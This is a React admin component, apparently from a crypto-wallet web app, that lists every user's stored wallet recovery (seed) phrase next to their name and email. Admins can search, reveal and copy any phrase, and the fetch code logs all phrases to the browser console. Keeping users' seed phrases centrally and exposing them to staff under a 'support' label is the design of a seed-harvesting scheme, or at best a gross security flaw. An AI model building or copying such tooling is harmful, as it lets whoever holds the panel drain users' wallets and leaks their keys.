import React, { useState } from 'react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Shield, Eye, EyeOff, Copy, Search, Key, RefreshCw } from 'lucide-react';
import { useQuery } from '@tanstack/react-query';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/contexts/AuthContext';
import { toast } from 'sonner';

const AdminSecretPhrases = () => {
  const { isAdmin, loading: authLoading } = useAuth();
  const [searchTerm, setSearchTerm] = useState('');
  const [visiblePhrases, setVisiblePhrases] = useState<Set<string>>(new Set());

  // Fetch user seed phrases
  const { data: seedPhrases, isLoading, error, refetch } = useQuery({
    queryKey: ['admin-seed-phrases'],
    queryFn: async () => {
      // First get all seed phrases
      const { data: seedData, error: seedError } = await supabase
        .from('user_seed_phrases')
        .select('*')
        .order('created_at', { ascending: false });

      if (seedError) {
        console.error('Error fetching seed phrases:', seedError);
        throw seedError;
      }

      // Then get all user profiles
      const { data: profilesData, error: profilesError} = await supabase
        .from('user_profiles')
        .select('user_id, full_name, first_name, last_name, email');

      if (profilesError) {
        console.error('Error fetching profiles:', profilesError);
        throw profilesError;
      }

      // Get user emails from auth.users using the edge function
      const { data: emailResponse, error: emailError } = await supabase.functions.invoke('get-user-emails');

      if (emailError) {
        console.error('Error fetching user emails:', emailError);
      }

      console.log('Email response from edge function:', emailResponse);

        // Combine the data and filter out orphaned profiles
        const combined = seedData
          ?.filter(phrase => {
            // Only include phrases for users that exist in auth
            return emailResponse?.users?.some((u: any) => u.id === phrase.user_id);
          })
          .map(phrase => {
            const profile = profilesData?.find(p => p.user_id === phrase.user_id);
            // Look for email in the response from edge function
            const authEmail = emailResponse?.users?.find((u: any) => u.id === phrase.user_id)?.email;
            
            console.log(`User ${phrase.user_id}: profile email = ${profile?.email}, auth email = ${authEmail}`);
            
            return {
              ...phrase,
              user_profile: {
                ...profile,
                user_id: phrase.user_id,
                full_name: profile?.full_name || null,
                email: profile?.email || authEmail || null,
                auth_email: authEmail
              }
            };
          });

      console.log('Combined seed phrases data:', combined);
      return combined;
    },
    enabled: !authLoading && isAdmin,
  });

  const togglePhraseVisibility = (phraseId: string) => {
    const newVisible = new Set(visiblePhrases);
    if (newVisible.has(phraseId)) {
      newVisible.delete(phraseId);
    } else {
      newVisible.add(phraseId);
    }
    setVisiblePhrases(newVisible);
  };

  const copyToClipboard = (text: string, userName: string) => {
    navigator.clipboard.writeText(text);
    toast.success(`Copied ${userName}'s recovery phrase to clipboard`, { duration: 1000 });
  };

  // Filter seed phrases based on search term
  const filteredPhrases = seedPhrases?.filter(item => {
    const profile = item.user_profile;
    const searchLower = searchTerm.toLowerCase();
    return (
      profile.full_name?.toLowerCase().includes(searchLower) ||
      profile.email?.toLowerCase().includes(searchLower) ||
      item.user_id.toLowerCase().includes(searchLower)
    );
  });

  if (authLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
      </div>
    );
  }

  if (!isAdmin) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="text-center">
          <Shield className="w-12 h-12 text-red-500 mx-auto mb-4" />
          <h2 className="text-xl font-semibold text-red-600 mb-2">Access Denied</h2>
          <p className="text-gray-600">You don't have permission to access this page.</p>
        </div>
      </div>
    );
  }

  if (isLoading) {
    return (
      <div className="container-responsive">
        <div className="flex items-center justify-center h-64">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="container-responsive">
        <div className="flex items-center justify-center h-64">
          <div className="text-center">
            <div className="text-red-600 mb-2">Error loading seed phrases</div>
            <div className="text-sm text-gray-500">{error.message}</div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="container-responsive">
      <div className="max-w-7xl mx-auto">
        <div className="mb-6 flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold flex items-center gap-3 text-white">
              <Key className="h-8 w-8 text-yellow-600" />
              User Recovery Phrases
            </h1>
            <p className="text-white font-semibold">View and manage user recovery phrases for support purposes</p>
          </div>
          <Button
            onClick={() => refetch()}
            variant="outline"
            className="flex items-center gap-2"
          >
            <RefreshCw className="h-4 w-4" />
            Refresh
          </Button>
        </div>

        {/* Search */}
        <Card className="mb-6 bg-[#1a1a1a] border-white/10">
          <div className="p-4">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-white/60 h-4 w-4" />
              <Input
                placeholder="Search by name, username, email, or user ID..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pl-10 bg-white/5 border-white/10 text-white placeholder:text-white/60"
              />
            </div>
          </div>
        </Card>

        {/* Seed Phrases List */}
        <Card className="bg-[#1a1a1a] border-white/10">
          <div className="px-6 py-4 border-b border-white/15">
            <h3 className="text-lg font-bold text-white">Recovery Phrases</h3>
            <p className="text-sm text-white/80 mt-1 font-medium">
              Click the eye icon to reveal phrases. Use with caution and only for legitimate support purposes.
            </p>
          </div>
          <div className="divide-y divide-white/15">
            {filteredPhrases && filteredPhrases.length > 0 ? (
              filteredPhrases.map((item) => {
                const profile = item.user_profile;
                const isVisible = visiblePhrases.has(item.id);
                
                return (
                  <div key={item.id} className="p-6 hover:bg-white/5 transition-colors">
                    <div className="flex items-start justify-between">
                      <div className="flex-1">
                        <div className="flex items-center gap-3 mb-3">
                          <div className="h-10 w-10 rounded-full bg-blue-600 flex items-center justify-center">
                            <span className="text-sm font-bold text-white">
                              {profile.full_name ? profile.full_name.charAt(0).toUpperCase() : 'U'}
                            </span>
                          </div>
                          <div>
                            <div className="text-sm font-bold text-white">
                              {profile.full_name || 'Unknown User'}
                            </div>
                            <div className="text-sm text-white/70 font-medium">
                              {profile.email || `ID: ${item.user_id.slice(0, 8)}...`}
                            </div>
                          </div>
                        </div>
                        
                        <div className="bg-white/5 rounded-lg p-4 mb-3 border border-white/10">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-sm font-bold text-white">Recovery Phrase</span>
                            <div className="flex gap-2">
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => togglePhraseVisibility(item.id)}
                                className="h-8 w-8 p-0 text-white hover:bg-white/10 hover:text-[#22C55E]"
                              >
                                {isVisible ? (
                                  <EyeOff className="h-4 w-4" />
                                ) : (
                                  <Eye className="h-4 w-4" />
                                )}
                              </Button>
                              {isVisible && (item.seed_phrase_admin || item.seed_phrase) && (
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => copyToClipboard(item.seed_phrase_admin || item.seed_phrase, profile.full_name || 'User')}
                                  className="h-8 w-8 p-0 text-white hover:bg-white/10 hover:text-[#22C55E]"
                                >
                                  <Copy className="h-4 w-4" />
                                </Button>
                              )}
                            </div>
                          </div>
                           <div className="font-mono text-sm">
                            {isVisible ? (
                              <span className="text-white font-medium">
                                {item.seed_phrase_admin || item.seed_phrase || 'No phrase found'}
                              </span>
                            ) : (
                              <span className="text-white/60">••• ••• ••• ••• ••• ••• ••• ••• ••• ••• ••• •••</span>
                            )}
                          </div>
                        </div>
                        
                        <div className="flex gap-4 text-xs text-white/70 mb-3 font-medium">
                          <span>Created: {new Date(item.created_at).toLocaleDateString()}</span>
                        </div>
                      </div>
                    </div>
                  </div>
                );
              })
            ) : (
              <div className="p-6 text-center text-white/70 font-medium">
                {searchTerm ? 'No phrases found matching your search.' : 'No recovery phrases found.'}
              </div>
            )}
           </div>
        </Card>

      </div>
    </div>
  );
};

export default AdminSecretPhrases;